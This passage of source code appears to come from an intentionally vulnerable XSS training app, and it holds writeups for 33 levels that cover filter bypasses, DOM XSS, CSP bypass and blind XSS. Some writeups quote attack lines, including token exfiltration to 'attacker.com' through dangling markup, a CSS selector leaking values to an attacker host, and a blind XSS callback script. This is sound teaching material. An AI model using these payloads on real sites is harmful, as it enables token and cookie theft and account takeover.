const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Level 21: detect the CSRF token arriving at ANY endpoint (simulates attacker-controlled server)
app.use((req, res, next) => {
  if (req.method === 'GET'
    && req.path !== '/level/21'
    && req.path !== '/api/leak-check'
    && req.query.csrf_token
    && req.query.csrf_token.includes('SUPER_SECRET_TOKEN')) {
    level21Leaked = req.url;
  }
  next();
});

// In-memory store for stored XSS levels
const guestbook = [];

// In-memory state for Level 21
let level21Leaked = false;

// In-memory stores for new levels
const markdownPosts = [];       // Level 28
const fileUploads = [];         // Level 32
const blindXSSLogs = [];        // Level 33

// Solutions tracker — persisted to disk
const SOLUTIONS_FILE = path.join(__dirname, 'solutions.json');

function loadSolutions () {
  try {
    if (fs.existsSync(SOLUTIONS_FILE)) {
      return JSON.parse(fs.readFileSync(SOLUTIONS_FILE, 'utf8'));
    }
  } catch (e) { /* ignore corrupt file */ }
  return {};
}

function saveSolutions () {
  fs.writeFileSync(SOLUTIONS_FILE, JSON.stringify(solutions, null, 2));
}

const solutions = loadSolutions();

// ============================================================
// WRITEUPS (all 33 levels)
// ============================================================
const writeups = {
  1: {
    title: 'Reflected XSS — No Defenses',
    why: 'Your input was placed directly into the HTML response with zero encoding or filtering. The browser parsed your <code>&lt;script&gt;</code> tag (or any HTML you injected) as part of the page structure and executed it.',
    lesson: 'This is the most basic form of XSS. Any time user input is reflected into HTML without encoding, an attacker can inject arbitrary markup. The fix is simple: <strong>HTML-encode</strong> all user output (<code>&lt;</code> → <code>&amp;lt;</code>, <code>&gt;</code> → <code>&amp;gt;</code>, etc.).',
    realWorld: 'Search pages, error messages that reflect URL parameters, and 404 pages that display the requested path are classic targets for reflected XSS.'
  },
  2: {
    title: 'Stored XSS — Persistent Injection',
    why: 'Your payload was stored in the server\'s database (in-memory array) and rendered every time any user visits the page. Unlike reflected XSS, the attacker doesn\'t need the victim to click a crafted link.',
    lesson: 'Stored XSS is more dangerous than reflected because it affects <strong>every visitor</strong> automatically. The payload persists and can steal sessions, deface pages, or spread like a worm. Always sanitize on both input and output.',
    realWorld: 'Comment sections, forum posts, user profiles, chat applications, and any feature where user content is saved and displayed to others.'
  },
  3: {
    title: 'Script Tag Filter Bypass',
    why: 'The filter only blocked <code>&lt;script&gt;</code> tags, but dozens of other HTML elements can execute JavaScript through event handlers. Elements like <code>&lt;img&gt;</code>, <code>&lt;svg&gt;</code>, <code>&lt;body&gt;</code>, <code>&lt;input&gt;</code>, <code>&lt;details&gt;</code>, and many more support <code>on*</code> event attributes.',
    lesson: 'Blocklist-based filtering (blocking specific tags) is fundamentally flawed. There are too many vectors to block them all. The correct approach is <strong>allowlist-based</strong>: only permit known-safe tags and attributes, or use contextual output encoding.',
    realWorld: 'Many WAFs and custom filters only block <code>&lt;script&gt;</code>. In bug bounties, always try alternative tags: <code>&lt;img&gt;</code>, <code>&lt;svg&gt;</code>, <code>&lt;math&gt;</code>, <code>&lt;iframe&gt;</code>, <code>&lt;object&gt;</code>, <code>&lt;embed&gt;</code>, <code>&lt;video&gt;</code>, <code>&lt;audio&gt;</code>, <code>&lt;marquee&gt;</code>, <code>&lt;details&gt;</code>.'
  },
  4: {
    title: 'Attribute Context Injection',
    why: 'Your input was placed inside a double-quoted HTML attribute value without encoding quotes. By injecting a <code>"</code> character, you closed the attribute, then added new attributes (like event handlers) or closed the tag entirely to inject new elements.',
    lesson: 'The <strong>injection context</strong> determines the exploit technique. In an attribute context, you need to break out of the quotes first. The defense is to HTML-encode quotes: <code>"</code> → <code>&amp;quot;</code> and <code>\'</code> → <code>&amp;#x27;</code>.',
    realWorld: 'Input fields that reflect values (search boxes, form pre-fills), meta tags with user-controlled content, and any attribute built from user input.'
  },
  5: {
    title: 'JavaScript String Context Injection',
    why: 'Your input was placed inside a JavaScript string literal. Even though angle brackets were HTML-encoded (preventing new tag injection), you could close the string with a quote character, then inject arbitrary JavaScript code.',
    lesson: 'HTML encoding alone is insufficient when the injection point is inside JavaScript. You need <strong>JavaScript-specific encoding</strong>: escape <code>\'</code> to <code>\\\'</code>, <code>"</code> to <code>\\"</code>, and <code>\\</code> to <code>\\\\</code>. Even better: avoid placing user input in inline JavaScript entirely. Use <code>data-*</code> attributes and read them with <code>getAttribute()</code>.',
    realWorld: 'Analytics scripts that embed user data, inline JS configuration objects, and any template that places user input inside <code>&lt;script&gt;</code> blocks.'
  },
  6: {
    title: 'Event Handler Blocklist Bypass',
    why: 'The filter blocked 12 common event handlers, but the HTML spec defines over 60 event handler attributes. Obscure handlers like <code>ontoggle</code>, <code>onwheel</code>, <code>onmousewheel</code>, <code>onpointerover</code>, <code>onanimationend</code>, <code>ontransitionend</code>, <code>onstart</code> (marquee), and <code>onpageshow</code> were not in the blocklist.',
    lesson: 'Event handler blocklists are an arms race you will always lose. New events are added to browsers regularly. The only safe approach is to <strong>strip all <code>on*</code> attributes</strong> with a pattern like <code>/on\\w+/</code>, or use a proper HTML sanitizer library like DOMPurify.',
    realWorld: 'WAFs frequently maintain incomplete event handler lists. Check the PortSwigger XSS cheat sheet for a comprehensive list of event handlers per browser.'
  },
  7: {
    title: 'Single-Pass Keyword Filter Bypass',
    why: 'The filter stripped keywords in a <strong>single pass</strong>. By nesting a keyword inside itself (e.g., <code>onerronerrorr</code>), when the inner <code>onerror</code> is removed, the remaining outer characters reassemble into <code>onerror</code>.',
    lesson: 'Single-pass string replacement is inherently bypassable. If you must filter by keyword removal, you need to <strong>loop until no more changes occur</strong> (recursive filtering). But even recursive filtering can be bypassed through encoding or alternative execution methods. Proper output encoding is always superior to input filtering.',
    realWorld: 'Many custom WAF rules and server-side filters use single-pass replacement. Always test nested payloads: <code>alalertert</code>, <code>&lt;scr&lt;script&gt;ipt&gt;</code>, <code>jajavascriptvascript:</code>.'
  },
  8: {
    title: 'DOM-Based XSS',
    why: 'The vulnerability was entirely in client-side JavaScript. The page read from <code>location.hash</code> (a <strong>source</strong>) and wrote it to <code>innerHTML</code> (a <strong>sink</strong>) without sanitization. The hash fragment is never sent to the server, making this invisible to server-side defenses.',
    lesson: 'DOM XSS requires analyzing client-side code for <strong>source-to-sink flows</strong>. Common sources: <code>location.hash</code>, <code>location.search</code>, <code>document.referrer</code>, <code>postMessage</code>, <code>localStorage</code>. Dangerous sinks: <code>innerHTML</code>, <code>outerHTML</code>, <code>document.write()</code>, <code>eval()</code>, <code>setTimeout(string)</code>, <code>.href</code>.',
    realWorld: 'Single-page applications (SPAs) are riddled with DOM XSS. Client-side routing, template rendering, and dynamic content injection are all common vectors. Tools like DOM Invader (Burp Suite) help find these.'
  },
  9: {
    title: 'href Injection with Protocol Filter Bypass',
    why: 'The filter checked for <code>javascript:</code> as a string, but browsers decode HTML entities in attribute values before interpreting the URL scheme. By using HTML entities like <code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;...</code> to spell "javascript:", the server\'s regex didn\'t match, but the browser decoded the entities and executed the protocol handler.',
    lesson: 'Browsers perform <strong>multiple decoding passes</strong> in different contexts. In an HTML attribute, entities are decoded first, then the URL is interpreted. Filters that check the raw string miss encoded payloads. The safe approach: parse the URL properly, check the protocol after decoding, and only allow <code>http:</code>, <code>https:</code>, and <code>mailto:</code> schemes.',
    realWorld: 'Any feature that lets users provide URLs: profile links, redirect parameters, "share via" features, embedded content. The <code>javascript:</code> protocol in <code>&lt;a href&gt;</code> is a classic bug bounty finding.'
  },
  10: {
    title: 'Content Security Policy Bypass via JSONP',
    why: 'The CSP allowed <code>\'self\'</code> as a script source, meaning any JavaScript file served from the same origin was trusted. The <code>/api/jsonp</code> endpoint reflected user input into a JavaScript response. By loading it as a <code>&lt;script src&gt;</code>, the callback parameter became executable code — and since it\'s same-origin, the CSP allowed it.',
    lesson: 'CSP with <code>\'self\'</code> is only as secure as <strong>every endpoint on your origin</strong>. JSONP endpoints, file upload endpoints serving JS, error pages with JS content, and any user-controlled response in a JS MIME type can be abused. Prefer <code>\'nonce-...\'</code> or <code>\'strict-dynamic\'</code> over <code>\'self\'</code>.',
    realWorld: 'Many real-world CSP bypasses exploit JSONP endpoints (Google APIs, legacy services), Angular libraries loaded from CDNs (<code>\'unsafe-eval\'</code>), or base tag injection to redirect script loads.'
  },
  11: {
    title: 'Double Encoding Bypass',
    why: 'The WAF decoded your input once and checked for dangerous patterns — finding none. But the application behind the WAF decoded the input <strong>a second time</strong>, turning harmless-looking percent-encoded text like <code>%3C</code> into actual <code>&lt;</code> characters. The WAF only saw <code>%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E</code> after its decode pass — just text with percent signs, not HTML tags or event handlers.',
    lesson: 'When multiple layers in the stack each URL-decode the input (reverse proxy, WAF, framework, application), a filter at one layer can be bypassed by encoding for the <strong>next</strong> layer. The fix: filters must decode input the same number of times as the application does, or better yet, apply output encoding at the final render step rather than relying on input filtering.',
    realWorld: 'Double encoding is one of the most common WAF bypass techniques. If a WAF URL-decodes once and checks, but the backend also URL-decodes, <code>%253C</code> passes the WAF as <code>%3C</code> but becomes <code>&lt;</code> on the server. This affects real-world WAFs like ModSecurity, Cloudflare (in older configs), and custom proxy chains. Always test <code>%25XX</code> encoding in bug bounties.'
  },
  12: {
    title: 'Client-Side Template Injection',
    why: 'Although all HTML tags were stripped server-side, the client-side template engine evaluated expressions inside <code>{{...}}</code> using <code>eval()</code>. Since template delimiters are plain text (not HTML tags), they survived the tag filter and were executed client-side.',
    lesson: 'Client-side template engines that use <code>eval()</code> or <code>Function()</code> to evaluate expressions are inherently dangerous when processing user input. This is a major risk in frameworks that support expression binding (AngularJS <code>{{...}}</code>, Vue.js <code>v-html</code>, etc.). Never pass user input through template expression evaluators.',
    realWorld: 'AngularJS sandbox escapes were a major bug class. Even with sandboxing, researchers repeatedly found ways to escape to arbitrary JS execution. Modern frameworks (Angular 2+, React) avoid <code>eval</code>, but legacy apps and custom template engines remain vulnerable.'
  },
  13: {
    title: 'postMessage XSS — Cross-Window Messaging',
    why: 'The page registered a <code>message</code> event listener that wrote <code>e.data</code> directly to <code>innerHTML</code> without checking <code>e.origin</code>. Any window (including the browser console, or a malicious page embedding this one in an iframe) could send a message with an XSS payload.',
    lesson: '<code>postMessage</code> is a common DOM XSS vector. Secure implementations must: (1) <strong>validate <code>e.origin</code></strong> against an allowlist, (2) <strong>validate/sanitize <code>e.data</code></strong> before using it, (3) never pass message data to dangerous sinks like <code>innerHTML</code> or <code>eval()</code>.',
    realWorld: 'OAuth popup flows, payment gateways, embedded widgets, and cross-domain iframe communication all use <code>postMessage</code>. Missing origin checks are a frequent finding in bug bounties. The attacker embeds the target in an iframe on their domain and sends malicious messages.'
  },
  14: {
    title: 'SVG Upload XSS',
    why: 'SVG files are XML-based and natively support JavaScript execution through event handler attributes (<code>onload</code>, <code>onmouseover</code>, etc.) and even <code>&lt;script&gt;</code> tags. The filter only stripped <code>&lt;script&gt;</code> tags but left SVG event handlers intact. When the SVG was rendered inline, the browser executed the event handlers.',
    lesson: 'SVG is one of the most dangerous file types for XSS. It supports inline scripting, event handlers, <code>&lt;foreignObject&gt;</code> (which can embed HTML), CSS <code>@import</code>, and external resource loading. If you must accept SVG uploads, either: (1) serve them with <code>Content-Disposition: attachment</code>, (2) serve from a separate sandbox domain, or (3) use a strict SVG sanitizer that strips all scripting.',
    realWorld: 'File upload features that accept SVGs (avatars, logos, images) are frequently vulnerable. Even Markdown renderers that allow inline SVGs can be exploited. Many CDNs serve uploaded SVGs with <code>Content-Type: image/svg+xml</code>, enabling script execution.'
  },
  15: {
    title: 'Mutation XSS — Template Blind Spot',
    why: 'The sanitizer used <code>querySelectorAll(\'*\')</code> to find and clean dangerous elements — but this DOM API <strong>does not traverse into <code>&lt;template&gt;</code> element content</strong>. Template content lives in a separate <code>DocumentFragment</code> that is opaque to standard DOM queries. The <code>&lt;img onerror=alert(1)&gt;</code> inside the template was never seen by the sanitizer, so it survived. After sanitization, the page instantiated all template elements by moving their content into the live DOM, causing the event handler to fire.',
    lesson: 'This is the core of mXSS: the sanitizer\'s view of the DOM differs from what actually executes. <code>querySelectorAll</code>, <code>getElementsByTagName</code>, and similar APIs all skip <code>&lt;template&gt;</code> content. Any post-sanitization step that promotes template content (framework rendering, <code>importNode</code>, cloning) re-introduces the unsanitized payload. The fix: either explicitly sanitize <code>template.content</code> recursively, or use DOMPurify which handles this case.',
    realWorld: 'Template blind spots affect real sanitizers in web component frameworks. DOMPurify had a similar bypass (CVE-2020-26870) where nested template elements evaded sanitization. Any app with a "sanitize then render" pipeline that processes templates is potentially vulnerable — this includes custom rich text editors, React SSR apps with dangerouslySetInnerHTML, and CMS comment renderers.'
  },
  16: {
    title: 'Recursive Filter Bypass via Context Escape',
    why: 'The recursive filter defeated all nesting and keyword tricks. But it only analyzed the <strong>top-level HTML context</strong>. By injecting an <code>&lt;iframe srcdoc="..."&gt;</code>, you created a new document context. HTML entities inside the <code>srcdoc</code> attribute are decoded by the browser when creating the iframe\'s document, reconstructing a payload that the server filter never saw as dangerous text.',
    lesson: 'Even the strongest server-side filter can be bypassed if you can <strong>escape to a different execution context</strong>. <code>srcdoc</code>, <code>data:</code> URLs, <code>&lt;object&gt;</code> tags, and <code>&lt;embed&gt;</code> elements can all create new browsing contexts where the filtered document\'s rules don\'t apply. Defense in depth requires CSP, not just filtering.',
    realWorld: 'This technique is relevant when facing strong WAFs. If the WAF filters the main document but you can inject an iframe with <code>srcdoc</code> or <code>src=data:text/html,...</code>, you get a clean execution context. Combined with HTML entity encoding, this bypasses most keyword-based filters.'
  },
  17: {
    title: 'The Polyglot — Multi-Context Injection',
    why: 'Your input appeared in three contexts: HTML body, an HTML attribute, and a JavaScript string. Each context has different parsing rules and different escaping requirements. The weakest context (the one with the least encoding applied) was the entry point for exploitation.',
    lesson: 'When the same input is used in multiple contexts, you must apply <strong>context-specific encoding for every context</strong>. HTML body needs entity encoding, attributes need attribute encoding (including quotes), and JavaScript strings need JS escaping. A single encoding function cannot protect all contexts. This is why frameworks with auto-escaping (React, Angular, Vue) are safer — they apply the right encoding for each context automatically.',
    realWorld: 'Polyglot payloads are useful in bug bounties when you\'re not sure where your input ends up, or when it appears in multiple places. Having a single payload that works across HTML, JS, and attribute contexts maximizes your chances of finding XSS during fuzzing.'
  },
  18: {
    title: 'DOM Clobbering — Overwriting Global Variables via HTML',
    why: 'The page\'s JavaScript read <code>window.config.href</code> to decide where to navigate. By injecting an HTML element with <code>id="config"</code>, you <strong>clobbered</strong> the global variable — replacing the JavaScript object with your DOM element. The browser\'s named access mechanism (<code>window[elementId]</code>) allowed your injected HTML to silently override application logic without executing any JavaScript.',
    lesson: 'DOM clobbering exploits the browser\'s automatic exposure of named elements on <code>window</code>. Any <code>id</code> or <code>name</code> attribute on an HTML element creates a <code>window</code> property. This means <code>&lt;a id=config href=...&gt;</code> overwrites <code>window.config</code> with the anchor element, and <code>window.config.href</code> returns the anchor\'s href. Defenses: use <code>Object.hasOwn()</code> or <code>hasOwnProperty()</code> checks, declare variables with <code>const/let</code> (block-scoped), or freeze config objects. Also consider using <code>Symbol</code> keys or a namespace object that can\'t be clobbered.',
    realWorld: 'DOM clobbering has been found in Google Search, Gmail, and several other major applications. It\'s particularly common in sanitized HTML contexts (like email clients and rich text editors) where JavaScript execution is blocked but HTML injection is possible. The HTML sanitizer DOMPurify specifically includes DOM clobbering protections. Bug bounty tip: look for code that reads from <code>window.*</code> without declaring the variable with <code>const/let</code>.'
  },
  19: {
    title: 'Prototype Pollution → XSS',
    why: 'The <code>merge()</code> function naively iterated over all properties of your JSON input, including <code>__proto__</code>. When it encountered <code>{"__proto__": {"html": "&lt;img...&gt;"}}</code>, it wrote to <code>target.__proto__</code> — which is <code>Object.prototype</code>. This polluted the prototype of ALL objects. When the render function later checked <code>config.html</code>, it found the value via prototype chain lookup even though <code>config</code> never had an <code>html</code> property directly.',
    lesson: 'Prototype pollution occurs when user input can modify <code>Object.prototype</code> through unsafe merge, clone, or extend operations. The <code>__proto__</code> property (and <code>constructor.prototype</code>) are the primary vectors. Once polluted, every object in the runtime inherits the attacker\'s values for any property it doesn\'t explicitly define. To prevent: (1) use <code>Object.create(null)</code> for merge targets, (2) blocklist <code>__proto__</code>, <code>constructor</code>, and <code>prototype</code> keys, (3) use <code>Map</code> instead of plain objects, (4) freeze <code>Object.prototype</code>.',
    realWorld: 'Prototype pollution has been found in lodash (<code>_.merge</code>, <code>_.defaultsDeep</code>), jQuery (<code>$.extend</code>), and hundreds of npm packages. In 2019, a prototype pollution in Lodash (CVE-2019-10744) affected millions of applications. Combined with gadgets (code that reads from prototype-pollutable properties and sinks into innerHTML/eval), it becomes a reliable XSS vector.'
  },
  20: {
    title: 'Base Tag Injection — Hijacking Relative URLs',
    why: 'By injecting <code>&lt;base href="/evil/"&gt;</code> before the page\'s script tag, you changed the base URL for all relative resource loads. The page\'s <code>&lt;script src="level20-app.js"&gt;</code> was a relative URL — instead of loading from <code>/level20-app.js</code>, it loaded from <code>/evil/level20-app.js</code>, which served attacker-controlled JavaScript.',
    lesson: 'The <code>&lt;base&gt;</code> element affects ALL relative URLs on the page: scripts, stylesheets, images, links, and form actions. If an attacker can inject a <code>&lt;base&gt;</code> tag, they can redirect script loads to their server while bypassing CSP (since the script\'s origin appears legitimate). Defense: (1) use the <code>base-uri</code> CSP directive to restrict <code>&lt;base&gt;</code> usage, (2) use absolute URLs for critical resources, (3) use Subresource Integrity (<code>integrity</code> attribute) on script tags.',
    realWorld: 'Base tag injection is a known CSP bypass technique. If CSP allows <code>\'self\'</code> but doesn\'t set <code>base-uri</code>, an attacker can inject <code>&lt;base&gt;</code> to redirect relative script loads. This has been used in real-world attacks against applications with strict CSP but missing <code>base-uri</code> directives.'
  },
  21: {
    title: 'Dangling Markup — Data Exfiltration Without Scripts',
    why: 'By injecting a tag with an unclosed attribute (like <code>&lt;img src="http://attacker.com/steal?</code>), the browser treats everything from the injection point to the next matching quote as part of the URL. The CSRF token in the hidden input was between your injection and the next <code>"</code>, so it was included in the image request URL — exfiltrating it without any JavaScript execution.',
    lesson: 'Dangling markup exploits HTML\'s tolerant parsing: an unclosed attribute "swallows" subsequent HTML content until a matching delimiter is found. This is a <strong>data exfiltration</strong> technique, not a code execution technique — it works even when all JavaScript vectors are blocked. Modern browsers mitigate some vectors (Chrome blocks <code>&lt;img&gt;</code> with newlines in URLs), but <code>&lt;meta refresh&gt;</code>, <code>&lt;a href&gt;</code>, <code>&lt;form action&gt;</code>, and <code>&lt;button formaction&gt;</code> remain viable. Defense: encode quotes in all output contexts and use CSP with strict <code>connect-src</code>.',
    realWorld: 'Dangling markup has been used to steal CSRF tokens, OAuth codes, and other secrets embedded in HTML. Google\'s security team has documented this technique extensively. It\'s particularly valuable when CSP blocks all script execution but the attacker can still inject HTML.'
  },
  22: {
    title: 'JSON Injection — Breaking Out of Script Context',
    why: 'Your input was placed inside a JSON string value within a trusted <code>&lt;script&gt;</code> block. The server escaped angle brackets (preventing HTML tag injection) but did not escape double quotes. By injecting <code>"</code>, you closed the JSON string, then injected arbitrary JavaScript that executed within the same nonced script block — completely bypassing CSP.',
    lesson: 'When user input is embedded in inline <code>&lt;script&gt;</code> blocks (as JSON, config objects, or template data), the attacker is already inside a trusted execution context. Escaping <code>&lt;</code> and <code>&gt;</code> prevents tag breakout but doesn\'t prevent breaking out of strings within the script. You must escape: <code>"</code> → <code>\\\\\"</code>, <code>\\\\</code> → <code>\\\\\\\\</code>, <code>/</code> → <code>\\\\/</code>, and line terminators. Better yet: use <code>JSON.stringify()</code> server-side, place data in <code>data-*</code> attributes, or use a separate API endpoint.',
    realWorld: 'This is one of the most common XSS patterns in modern web apps. Server-side rendering frameworks (Next.js, Nuxt, Rails) that embed state into <code>&lt;script&gt;</code> tags for hydration are frequent targets. CSP doesn\'t help because the injection is inside an already-trusted script block.'
  },
  23: {
    title: 'URL Scheme Bypass — HTML Entity Decoding Mismatch',
    why: 'The server checked the raw input string for <code>javascript:</code> and didn\'t find it — because you encoded one or more characters as HTML entities (e.g., <code>&amp;#106;</code> for "j"). However, when the browser rendered the <code>&lt;a href="..."&gt;</code>, it decoded the HTML entities in the attribute value before interpreting the URL scheme. The result: the browser saw <code>javascript:alert(1)</code> and executed it when the link was clicked.',
    lesson: 'This is a classic <strong>encoding mismatch</strong> between server-side filtering and browser-side parsing. The server operates on raw strings; the browser decodes HTML entities in attributes before processing URLs. To prevent this: (1) decode all HTML entities server-side before checking the URL scheme, (2) use a proper URL parser to extract the scheme after decoding, (3) allowlist only safe schemes (<code>http:</code>, <code>https:</code>, <code>mailto:</code>) rather than blocklisting dangerous ones.',
    realWorld: 'This exact technique has been found in countless bug bounties. Any feature that puts user input into <code>href</code>, <code>src</code>, <code>action</code>, or <code>formaction</code> attributes while filtering <code>javascript:</code> as a raw string is vulnerable. It appears in link-sharing features, redirect parameters, user profile URLs, and "click to call" implementations. The mismatch between server string matching and browser HTML parsing is one of the most fundamental security concepts in web security.'
  },
  24: {
    title: 'CSS Injection — Attribute Exfiltration via Style',
    why: 'The page allowed injecting CSS into a <code>&lt;style&gt;</code> block. Using attribute selectors combined with <code>background-image: url()</code>, you crafted rules that fired requests to an attacker-controlled endpoint only when a specific hidden value matched — leaking one character at a time.',
    lesson: 'CSS injection can exfiltrate data <strong>without any JavaScript</strong>. Selectors like <code>input[value^="a"] { background: url(//attacker/a) }</code> fire a network request only when the element\'s value starts with "a". Iterating over every possible first character reveals the secret one character at a time. This technique works even under strict CSP (with <code>connect-src</code> missing) and bypasses XSS-focused sanitizers entirely.',
    realWorld: 'CSS injection has been used to steal CSRF tokens, password manager autofill values, and hidden form fields. It was documented against real-world sites including a major password manager. Any user-controlled CSS (custom themes, user stylesheets, inline style injection) is a potential data exfiltration vector.'
  },
  25: {
    title: 'Open Redirect → XSS Chain',
    why: 'The application had an open redirect endpoint that reflected the <code>next</code> parameter into a <code>Location</code> header and a meta-refresh tag without proper validation. By supplying <code>javascript:</code> as the redirect target, the meta-refresh executed the JavaScript payload when the browser processed it.',
    lesson: 'Open redirects become XSS when the redirect destination is reflected into executable contexts. A <code>Location: javascript:alert(1)</code> header is blocked by modern browsers, but a <code>&lt;meta http-equiv="refresh" content="0;url=javascript:alert(1)"&gt;</code> tag is not. Always validate redirect URLs against an allowlist of trusted destinations, not just a blocklist of dangerous schemes.',
    realWorld: 'Open redirect → XSS chains appear in bug bounty programs regularly. OAuth flows with <code>redirect_uri</code> parameters are prime targets. A seemingly low-severity open redirect becomes critical when it can be chained to deliver XSS via meta-refresh or when combined with a <code>javascript:</code> URL in supported contexts.'
  },
  26: {
    title: 'CRLF Injection → XSS via HTTP Response Splitting',
    why: 'The server reflected your input into an HTTP response header (the <code>X-User</code> header) without stripping carriage return (<code>\\r</code>) and newline (<code>\\n</code>) characters. By injecting <code>%0d%0a</code>, you inserted extra headers and an extra blank line — splitting the HTTP response. Everything after the injected blank line was treated as the response body, allowing you to inject arbitrary HTML.',
    lesson: 'HTTP response splitting occurs when user input containing <code>CR</code>/<code>LF</code> characters reaches a response header. The HTTP spec uses <code>\\r\\n</code> to separate headers, and a double <code>\\r\\n</code> terminates the header section. <strong>Always strip or encode newline characters</strong> before placing user input in response headers. Modern Node.js/Express versions throw on newlines in headers, but older frameworks and custom header-writing code remain vulnerable.',
    realWorld: 'CRLF injection has been found in login/logout redirect flows, language selectors, and any feature that echoes user input into response headers. It can lead to XSS, cache poisoning, and session fixation. This vulnerability class is often overlooked because it lives in headers rather than HTML.'
  },
  27: {
    title: 'DOM XSS via localStorage Persistence',
    why: 'The page stored user-supplied data in <code>localStorage</code> and later retrieved it, writing it directly to <code>innerHTML</code> without sanitization. Unlike reflected XSS, the payload persisted across page reloads and was never sent to the server — making it invisible to server-side logging and WAFs.',
    lesson: '<code>localStorage</code> is a DOM source just like <code>location.hash</code>. Data written to storage can persist indefinitely and fire on any future page load. Any flow that reads from storage and writes to a dangerous sink (<code>innerHTML</code>, <code>eval</code>, <code>document.write</code>) creates stored DOM XSS. Sanitize all data <strong>on read</strong> from storage, not just on write — you never know what else can write to storage.',
    realWorld: 'localStorage-based XSS is common in SPAs that cache user preferences, themes, or profile data. It\'s particularly dangerous because it can persist even after the injection vector is patched. Extensions, third-party scripts, and subdomain takeovers can also write to a domain\'s localStorage, creating a stored XSS gadget.'
  },
  28: {
    title: 'Markdown Injection — Renderer Exploitation',
    why: 'The Markdown renderer converted user-supplied text to HTML using a naive regex approach that supported inline HTML and raw link syntax. By crafting a link with a <code>javascript:</code> URL or injecting raw HTML tags directly, the renderer passed the content through without sanitization.',
    lesson: 'Markdown parsers present a unique attack surface: they are designed to produce HTML from user input. Naive implementations that allow raw HTML pass-through, support <code>javascript:</code> in link URLs, or process inline attributes become XSS vectors. Secure Markdown rendering requires: (1) disabling raw HTML pass-through, (2) URL-scheme allowlisting for links, (3) post-render sanitization with a library like DOMPurify.',
    realWorld: 'Markdown-to-XSS has been found in GitHub (old comment renderer), GitLab, Jira, Confluence, and dozens of documentation platforms. Any user-generated content rendered via Markdown is at risk if the renderer isn\'t carefully hardened. This is a top finding in bug bounty programs targeting developer tools and collaboration platforms.'
  },
  29: {
    title: 'iframe sandbox Escape',
    why: 'The page embedded user content in a sandboxed iframe with <code>allow-scripts allow-same-origin</code>. With both permissions granted simultaneously, the sandboxed frame could access the parent\'s <code>window</code> object via <code>parent</code> and call <code>parent.alert()</code>, effectively escaping the sandbox.',
    lesson: 'The combination of <code>allow-scripts</code> and <code>allow-same-origin</code> in an iframe sandbox is dangerous. <code>allow-same-origin</code> means the frame is treated as same-origin as the parent, allowing DOM access. <code>allow-scripts</code> enables JavaScript. Together, script in the frame can access <code>parent.document</code> and remove the sandbox entirely. <strong>Never use both together</strong> for untrusted content.',
    realWorld: 'Sandbox escapes via <code>allow-scripts allow-same-origin</code> have been documented in the HTML spec itself as a known footgun. Web-based IDEs, code playgrounds, and rich text editors that sandbox user content are frequently misconfigured this way. The fix: use only <code>allow-scripts</code> OR <code>allow-same-origin</code>, never both.'
  },
  30: {
    title: 'AngularJS Sandbox Escape (Legacy CSTI)',
    why: 'The page used AngularJS 1.x and passed user input into an expression context. AngularJS evaluates expressions inside <code>{{...}}</code> and attribute directives. By using constructor chain tricks (<code>constructor.constructor</code> accesses <code>Function</code>), you escaped the AngularJS expression sandbox to execute arbitrary JavaScript.',
    lesson: 'AngularJS 1.x had an expression sandbox meant to prevent arbitrary code execution. Researchers repeatedly bypassed it through constructor chain escapes, <code>toString</code> overrides, and other prototype tricks. The AngularJS team eventually <strong>removed the sandbox entirely</strong> in v1.6, acknowledging it was security theater. The lesson: expression sandbox != security boundary. Never expose user-controlled input to template expression evaluation.',
    realWorld: 'AngularJS client-side template injection (CSTI) was one of the most common XSS findings in 2015-2020. It appears on HackerOne and Bugcrowd programs constantly. Any legacy app running AngularJS 1.x that reflects user input into HTML evaluated by Angular is vulnerable. The PortSwigger XSS cheat sheet maintains a list of working payloads for different AngularJS versions.'
  },
  31: {
    title: 'Web Components — slot Injection via Shadow DOM',
    why: 'The custom element used <code>innerHTML</code> to build its shadow DOM, injecting a user-controlled slot name unsanitized. By closing the attribute and injecting an event handler into the shadow template, the payload executed when the component rendered. Shadow DOM does not provide a security boundary — it is only a style/DOM encapsulation feature.',
    lesson: 'Shadow DOM is a <strong>DOM encapsulation</strong> mechanism, not a security sandbox. JavaScript from the outer page can access shadow roots with <code>element.shadowRoot</code> (for open mode). Slot injection and innerHTML usage inside custom elements carry the same XSS risks as in regular DOM. Sanitize all user input before using it in shadow DOM construction, just as you would in normal DOM.',
    realWorld: 'As web components become more common in frontend frameworks (Lit, Stencil, native custom elements), shadow DOM XSS is an emerging attack surface. Many developers incorrectly assume the shadow boundary provides security isolation. Slot injection in particular is underexplored in bug bounty programs and often overlooked in code reviews.'
  },
  32: {
    title: 'XSS via Filename Injection',
    why: 'The upload interface reflected the filename directly into the page\'s HTML to show "currently uploaded: <filename>". The filename was never sanitized. By naming the file <code>&lt;img src=x onerror=alert(1)&gt;.jpg</code>, the injected HTML executed when the file list was rendered.',
    lesson: 'Filenames are user-controlled input. They can contain any characters and must be treated with the same caution as form inputs. Filenames frequently appear in: upload confirmation messages, download links, directory listings, log viewers, and admin panels. <strong>Always HTML-encode filenames</strong> before rendering them in HTML. Also validate server-side — path traversal characters (<code>../</code>), null bytes, and shell metacharacters are additional risks.',
    realWorld: 'Filename-based XSS appears regularly in bug bounty programs. Cloud storage interfaces, document management systems, media libraries, and any feature with a file browser are common targets. The attack is particularly impactful when filenames are displayed to other users (shared drives, collaborative tools) turning it into stored XSS.'
  },
  33: {
    title: 'Blind XSS — Out-of-Band Execution',
    why: 'Your payload was submitted through a form that feeds an "admin review panel" — a page you can\'t directly access. The payload executed when an admin (simulated by a server-side renderer) loaded the review queue. The XSS fired out-of-band, reporting back to a listener endpoint with the admin\'s cookie and page content.',
    lesson: 'Blind XSS fires in a context you cannot directly observe — admin panels, log viewers, support ticket systems, CRM notes, email previews, and PDF generators. The attack pattern: inject a payload with an out-of-band callback (e.g., <code>&lt;script src="//your-server/payload.js"&gt;</code>), then wait for the callback. Tools like XSS Hunter automate this. Blind XSS often leads to <strong>admin account takeover</strong> since the victim is a privileged user.',
    realWorld: 'Blind XSS is one of the highest-severity XSS variants in bug bounty programs. Contact forms, support tickets, user-agent strings, order notes, and feedback forms are classic blind XSS injection points. The payload executes in an admin context with high privileges. XSS Hunter, Interactsh, and Burp Collaborator are used to catch out-of-band callbacks.'
  }
};

// ============================================================
// API: Record a solved level
// ============================================================
app.post('/api/solve', (req, res) => {
  const { level, payload, url } = req.body;
  if (!level) return res.status(400).json({ error: 'Missing level' });
  if (!solutions[level]) {
